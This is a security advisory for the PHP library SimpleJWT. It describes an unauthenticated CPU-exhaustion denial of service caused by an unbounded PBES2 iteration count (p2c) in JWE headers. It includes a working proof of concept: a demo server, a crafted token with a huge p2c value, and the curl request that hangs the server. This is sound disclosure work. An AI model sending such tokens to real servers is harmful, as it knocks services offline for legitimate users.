# [H] SimpleJWT has an Unauthenticated Denial of Service via JWE header tampering

## Summary
Severity: High
Advisory: GHSA-xw36-67f8-339x
CVE: CVE-2026-33204
CWE: CWE-400
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-xw36-67f8-339x
Type: github-advisory

## Affected
- Packagist: `kelvinmo/simplejwt` — affected >=0 <1.1.1

## Details
## Summary

An unauthenticated attacker can perform a Denial of Service via JWE header tampering when PBES2 algorithms are used.  
Applications that call `JWE::decrypt()` on attacker-controlled JWEs using PBES2 algorithms are affected.

## Details

PHP version: `PHP 8.4.11`
SimpleJWT version: `v1.1.0`

The relevant portion of the vulnerable implementation is shown below ([PBES2.php](https://github.com/kelvinmo/simplejwt/blob/edb7807a240b72c59e72d7dca31add9d16555f9f/src/SimpleJWT/Crypt/KeyManagement/PBES2.php)):

```PHP
<?php
/* ... SNIP ... */
class PBES2 extends BaseAlgorithm implements KeyEncryptionAlgorithm {
    use AESKeyWrapTrait;

    /** @var array<string, mixed> $alg_params */
    static protected $alg_params = [
        'PBES2-HS256+A128KW' => ['hash' => 'sha256'],
        'PBES2-HS384+A192KW' => ['hash' => 'sha384'],
        'PBES2-HS512+A256KW' => ['hash' => 'sha512']
    ];

    /** @var truthy-string $hash_alg */
    protected $hash_alg;

    /** @var int $iterations */
    protected $iterations = 4096;
    
    /* ... SNIP ... */

    /**
     * Sets the number of iterations to use in PBKFD2 key generation.
     *
     * @param int $iterations number of iterations
     * @return void
     */
    public function setIterations(int $iterations) {
        $this->iterations = $iterations;
    }
    
    /* ... SNIP ... */

    /**
     * {@inheritdoc}
     */
    public function decryptKey(string $encrypted_key, KeySet $keys, array $headers, ?string $kid = null): string {
        /** @var SymmetricKey $key */
        $key = $this->selectKey($keys, $kid);
        if ($key == null) {
            throw new CryptException('Key not found or is invalid', CryptException::KEY_NOT_FOUND_ERROR);
        }
        if (!isset($headers['p2s']) || !isset($headers['p2c'])) {
            throw new CryptException('p2s or p2c headers not set', CryptException::INVALID_DATA_ERROR);
        }

        $derived_key = $this->generateKeyFromPassword($key->toBinary(), $headers);
        return $this->unwrapKey($encrypted_key, $derived_key, $headers);
    }
    
    /* ... SNIP ... */

    /**
     * @param array<string, mixed> $headers
     */
    private function generateKeyFromPassword(string $password, array $headers): string {
        $salt = $headers['alg'] . "\x00" . Util::base64url_decode($headers['p2s']);
        /** @var int<0, max> $length */
        $length = intdiv($this->getAESKWKeySize(), 8);

        return hash_pbkdf2($this->hash_alg, $password, $salt, $headers['p2c'], $length, true);
    }
}
?>
```

The security flaw lies in the lack of input validation when handling JWEs that uses PBES2.  
A "sanity ceiling" is not set on the iteration count, which is the parameter known in the JWE specification as `p2c` ([RFC7518](https://datatracker.ietf.org/doc/html/rfc7518#section-4.8.1.2)).  
The library calls `decryptKey()` with the untrusted input `$headers` which then use the PHP function `hash_pbkdf2()` with the user-supplied value `$headers['p2c']`.

This results in an algorithmic complexity denial-of-service (CPU exhaustion) because the PBKDF2 iteration count is fully attacker-controlled.  
Because the header is processed before successful decryption and authentication, the attack can be triggered using an invalid JWE, meaning authentication is not required.

## Proof of Concept

Spin up a simple PHP server which accepts a JWE as input and tries to decrypt the user supplied JWE.

```bash
mkdir simplejwt-poc
cd simplejwt-poc
composer install
composer require kelvinmo/simplejwt
php -S localhost:8000
```

The content of `index.php`:

```php
<?php

require __DIR__ . '/vendor/autoload.php';

$set = SimpleJWT\Keys\KeySet::createFromSecret('secret123');

$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$method = $_SERVER['REQUEST_METHOD'];

if ($uri === '/encrypt' && $method === 'GET') {
    // Note $headers['alg'] and $headers['enc'] are required
    $headers = ['alg' => 'PBES2-HS256+A128KW', 'enc' => 'A256CBC-HS512'];
    $plaintext = 'This is the plaintext I want to encrypt.';
    $jwe = new SimpleJWT\JWE($headers, $plaintext);

    try {
        echo "Encrypted JWE: " . $jwe->encrypt($set);
    } catch (\RuntimeException $e) {
        echo $e;
    }
}

elseif ($uri === '/decrypt' && $method === 'GET') {
    try {
        $jwe = $_GET['s'];
        $jwe = SimpleJWT\JWE::decrypt($jwe, $set, 'PBES2-HS256+A128KW');
    } catch (SimpleJWT\InvalidTokenException $e) {
        echo $e;
    }
    echo $jwe->getHeader('alg') . "<br>";
    echo $jwe->getHeader('enc') . "<br>";
    echo $jwe->getPlaintext() . "<br>";
    }

else {
    http_response_code(404);
    echo "Route not found";
}

?>
```

We have to craft a JWE (even unsigned and unencrypted) with this header, notice the extremely large p2c value (more than 400 billion iterations):

```json
{
    "alg": "PBES2-HS256+A128KW",
    "enc": "A128CBC-HS256",
    "p2s": "blablabla",
    "p2c": 409123223136
}
```

The final JWE with poisoned header: `eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwicDJzIjoiYmxhYmxhYmxhIiwicDJjIjo0MDkxMjMyMjMxMzZ9.bla.bla.bla.bla`.

Notice that only the header needs to be valid Base64URL JSON, the remaining JWE segments can contain arbitrary data.

Perform the following request to the server (which tries to derive the PBES2 key):

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: localhost:8000' \
    $'http://localhost:8000/decrypt?s=eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwicDJzIjoiYmxhYmxhYmxhIiwicDJjIjo0MDkxMjMyMjMxMzZ9.bla.bla.bla.bla'
```

The request blocks the worker until the PHP execution timeout is reached, shutting down the server:

```console
[Sun Mar 15 11:42:18 2026] PHP 8.4.11 Development Server (http://localhost:8000) started
[Sun Mar 15 11:42:20 2026] 127.0.0.1:38532 Accepted

Fatal error: Maximum execution time of 30+2 seconds exceeded (terminated) in /home/edoardottt/hack/test/simplejwt-poc/vendor/kelvinmo/simplejwt/src/SimpleJWT/Crypt/KeyManagement/PBES2.php on line 168
```

## Impact

An attacker can send a crafted JWE with an extremely large `p2c` value to force the server to perform a very large number of PBKDF2 iterations.  
This causes excessive CPU consumption during key derivation and blocks the request worker until execution limits are reached.  
Repeated requests can exhaust server resources and make the application unavailable to legitimate users.

## Credits 

Edoardo Ottavianelli (@edoardottt)

## References
- https://github.com/kelvinmo/simplejwt/security/advisories/GHSA-xw36-67f8-339x
- https://nvd.nist.gov/vuln/detail/CVE-2026-33204
- https://github.com/kelvinmo/simplejwt
- https://github.com/kelvinmo/simplejwt/releases/tag/v1.1.1
